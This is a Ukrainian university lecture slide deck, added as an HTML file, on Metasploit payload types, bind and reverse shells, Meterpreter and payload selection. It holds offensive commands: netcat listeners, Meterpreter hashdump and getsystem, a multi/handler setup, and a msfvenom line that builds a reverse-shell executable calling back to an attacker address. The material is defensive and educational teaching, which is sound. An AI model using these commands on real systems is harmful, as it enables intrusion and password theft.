@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 5.4 — Фреймворк Metasploit та експлуатація</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="5">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Пейлоади та шелл-коди</h1>
+      <div class="subtitle">Тема 5.4 — Фреймворк Metasploit та експлуатація</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Типи пейлоадів -->
+    <section class="slide">
+      <h2>Типи пейлоадів</h2>
+
+      <div class="info-box">
+        <strong>Пейлоад (Payload)</strong> — це код, що виконується на цільовій системі після успішної експлуатації вразливості. Визначає, що саме відбудеться після зламу.
+      </div>
+
+      <div class="three-col-grid">
+        <div class="card-blue">
+          <h3>Singles (Inline)</h3>
+          <p><strong>Автономні пейлоади</strong></p>
+          <ul>
+            <li>Усе в одному пакеті</li>
+            <li>Більший розмір</li>
+            <li>Не потребують другого з'єднання</li>
+            <li>Простіші, але менш гнучкі</li>
+          </ul>
+          <div class="code-block">
+            windows/shell_reverse_tcp
+          </div>
+          <p style="font-size: 0.9em; margin-top: 10px;">Використовують <span class="highlight">_ (підкреслення)</span> у назві</p>
+        </div>
+
+        <div class="card-green">
+          <h3>Stagers</h3>
+          <p><strong>Завантажувачі стадій</strong></p>
+          <ul>
+            <li>Дуже малий розмір (100-300 байт)</li>
+            <li>Встановлює канал зв'язку</li>
+            <li>Завантажує другу стадію</li>
+            <li>Обходить обмеження розміру</li>
+          </ul>
+          <div class="code-block">
+            windows/meterpreter/<span class="highlight">reverse_tcp</span>
+          </div>
+          <p style="font-size: 0.9em; margin-top: 10px;">Використовують <span class="highlight">/ (слеш)</span> між стадіями</p>
+        </div>
+
+        <div class="card-purple">
+          <h3>Stages</h3>
+          <p><strong>Повнофункціональні стадії</strong></p>
+          <ul>
+            <li>Завантажуються стейджером</li>
+            <li>Більший розмір, більше функцій</li>
+            <li>Meterpreter, VNC, shell</li>
+            <li>Модульна архітектура</li>
+          </ul>
+          <div class="code-block">
+            <span class="highlight">meterpreter</span><br>
+            vncinject<br>
+            shell
+          </div>
+          <p style="font-size: 0.9em; margin-top: 10px;">Завантажуються після встановлення з'єднання</p>
+        </div>
+      </div>
+
+      <div class="warning-box">
+        <strong>Синтаксис:</strong> Singles: <code>os/payload_name</code> | Staged: <code>os/stage/stager</code>
+      </div>
+    </section>
+
+    <!-- Slide 3: Bind vs Reverse Shell -->
+    <section class="slide">
+      <h2>Bind Shell vs Reverse Shell</h2>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-red">
+            <h3>Bind Shell</h3>
+            <p><strong>Ціль відкриває порт</strong></p>
+
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+              <div style="text-align: center; font-size: 1.3em; line-height: 1.8;">
+                Атакувач<br>
+                ↓ підключається<br>
+                Ціль (слухає порт 4444)
+              </div>
+            </div>
+
+            <ul style="font-size: 0.95em;">
+              <li>Ціль відкриває порт і чекає</li>
+              <li>Атакувач підключається ДО цілі</li>
+              <li>Блокується фаєрволами</li>
+              <li>Проблеми з NAT</li>
+            </ul>
+
+            <div class="code-block">
+              <span class="code-comment"># MSF payload</span><br>
+              windows/shell/bind_tcp<br>
+              linux/x64/shell_bind_tcp<br><br>
+
+              <span class="code-comment"># Підключення (атакувач)</span><br>
+              nc <span class="code-string">target_ip 4444</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-green">
+            <h3>Reverse Shell</h3>
+            <p><strong>Ціль підключається назад</strong></p>
+
+            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
+              <div style="text-align: center; font-size: 1.3em; line-height: 1.8;">
+                Атакувач (слухає порт 4444)<br>
+                ↑ підключається назад<br>
+                Ціль
+              </div>
+            </div>
+
+            <ul style="font-size: 0.95em;">
+              <li>Атакувач відкриває порт і чекає</li>
+              <li>Ціль підключається НАЗАД до атакувача</li>
+              <li>Обходить більшість фаєрволів</li>
+              <li>Працює через NAT</li>
+            </ul>
+
+            <div class="code-block">
+              <span class="code-comment"># MSF payload</span><br>
+              windows/shell/reverse_tcp<br>
+              linux/x64/shell_reverse_tcp<br><br>
+
+              <span class="code-comment"># Прослуховування (атакувач)</span><br>
+              nc -lvnp <span class="code-string">4444</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box">
+        <strong>Практична порада:</strong> Reverse shell — стандартний вибір у 95% випадків. Обходить вихідні фаєрволи, працює через NAT, менш помітний для систем виявлення вторгнень.
+      </div>
+    </section>
+
+    <!-- Slide 4: Meterpreter -->
+    <section class="slide">
+      <h2>Meterpreter — просунутий пейлоад</h2>
+
+      <div class="info-box">
+        <strong>Meterpreter (Meta-Interpreter)</strong> — найпотужніший пейлоад Metasploit. Працює повністю в оперативній пам'яті (in-memory), не створює файлів на диску, динамічно розширюється модулями.
+      </div>
+
+      <div class="two-column">
+        <div class="column">
+          <h3>Основні можливості</h3>
+          <ul class="checklist">
+            <li>Завантаження/вивантаження файлів</li>
+            <li>Скріншоти та доступ до вебкамери</li>
+            <li>Кейлоггер (перехоплення клавіш)</li>
+            <li>Міграція між процесами</li>
+            <li>Дамп паролів (hashdump)</li>
+            <li>Проброс портів (port forwarding)</li>
+            <li>Pivoting (використання як проксі)</li>
+            <li>Обхід антивірусів (in-memory)</li>
+          </ul>
+
+          <div class="code-block">
+            <span class="code-comment"># Ключові команди Meterpreter</span><br>
+            sysinfo             <span class="code-comment"># Інфо про систему</span><br>
+            getuid              <span class="code-comment"># Поточний користувач</span><br>
+            getsystem           <span class="code-comment"># Підвищення до SYSTEM</span><br>
+            hashdump            <span class="code-comment"># Дамп паролів</span><br>
+            upload file.exe     <span class="code-comment"># Завантажити файл</span><br>
+            download secret.txt <span class="code-comment"># Скачати файл</span><br>
+            shell               <span class="code-comment"># Запустити cmd/bash</span><br>
+            migrate 1234        <span class="code-comment"># Перейти в інший процес</span><br>
+            run post/windows/gather/enum_shares
+          </div>
+        </div>
+
+        <div class="column">
+          <h3>Варіанти Meterpreter</h3>
+          <table class="comparison-table">
+            <thead>
+              <tr>
+                <th>Пейлоад</th>
+                <th>ОС/Середовище</th>
+                <th>Застосування</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="cell-blue"><code>windows/meterpreter</code></td>
+                <td>Windows (x86/x64)</td>
+                <td>Найпопулярніший, повний функціонал</td>
+              </tr>
+              <tr>
+                <td class="cell-green"><code>linux/x64/meterpreter</code></td>
+                <td>Linux (x64)</td>
+                <td>Серверні системи, контейнери</td>
+              </tr>
+              <tr>
+                <td class="cell-yellow"><code>php/meterpreter</code></td>
+                <td>PHP</td>
+                <td>Веб-додатки, CMS (WordPress, Joomla)</td>
+              </tr>
+              <tr>
+                <td class="cell-purple"><code>java/meterpreter</code></td>
+                <td>Java (JVM)</td>
+                <td>Веб-сервери (Tomcat, JBoss)</td>
+              </tr>
+              <tr>
+                <td class="cell-red"><code>python/meterpreter</code></td>
+                <td>Python</td>
+                <td>Системи з Python (Linux, macOS)</td>
+              </tr>
+              <tr>
+                <td class="cell-blue"><code>android/meterpreter</code></td>
+                <td>Android</td>
+                <td>Мобільні пристрої</td>
+              </tr>
+            </tbody>
+          </table>
+
+          <div class="success-box" style="margin-top: 15px;">
+            <strong>Переваги:</strong> Шифрований канал, модульність, скриптування (AutoRunScript), стабільність.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 5: Вибір пейлоаду -->
+    <section class="slide">
+      <h2>Вибір правильного пейлоаду</h2>
+
+      <div class="three-col-grid">
+        <div class="card-blue">
+          <h3>Windows</h3>
+          <p><strong>Найпоширеніший сценарій</strong></p>
+          <div class="code-block">
+            <span class="code-comment"># Стандартний вибір</span><br>
+            windows/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp<br><br>
+
+            <span class="code-comment"># HTTPS (обхід DPI)</span><br>
+            windows/meterpreter/<br>
+            &nbsp;&nbsp;reverse_https<br><br>
+
+            <span class="code-comment"># x64 системи</span><br>
+            windows/x64/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp
+          </div>
+        </div>
+
+        <div class="card-green">
+          <h3>Linux</h3>
+          <p><strong>Сервери та контейнери</strong></p>
+          <div class="code-block">
+            <span class="code-comment"># x64 (найпоширеніше)</span><br>
+            linux/x64/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp<br><br>
+
+            <span class="code-comment"># Старі системи (x86)</span><br>
+            linux/x86/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp<br><br>
+
+            <span class="code-comment"># Простий shell</span><br>
+            linux/x64/shell/<br>
+            &nbsp;&nbsp;reverse_tcp
+          </div>
+        </div>
+
+        <div class="card-yellow">
+          <h3>Веб-додатки</h3>
+          <p><strong>PHP, Java, Python</strong></p>
+          <div class="code-block">
+            <span class="code-comment"># PHP (WordPress, Drupal)</span><br>
+            php/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp<br><br>
+
+            <span class="code-comment"># Java (Tomcat, JBoss)</span><br>
+            java/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp<br><br>
+
+            <span class="code-comment"># Python</span><br>
+            python/meterpreter/<br>
+            &nbsp;&nbsp;reverse_tcp
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box">
+        <strong>Додаткові транспорти:</strong> <code>reverse_tcp</code> (швидкий), <code>reverse_http</code> (обхід фаєрволів), <code>reverse_https</code> (шифрування + обхід інспекції), <code>bind_tcp</code> (якщо reverse неможливий)
+      </div>
+
+      <div class="code-block">
+        <span class="code-comment"># Приклад налаштування пейлоаду в MSFconsole</span><br>
+        msf6 exploit(multi/handler) > <span class="code-keyword">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br>
+        msf6 exploit(multi/handler) > <span class="code-keyword">set</span> LHOST <span class="code-string">192.168.1.10</span><br>
+        msf6 exploit(multi/handler) > <span class="code-keyword">set</span> LPORT <span class="code-string">4444</span><br>
+        msf6 exploit(multi/handler) > <span class="code-keyword">exploit</span><br><br>
+
+        <span class="code-comment"># Альтернативно — використовуючи msfvenom</span><br>
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="code-string">10.10.14.5</span> LPORT=<span class="code-string">4444</span> -f exe -o payload.exe
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
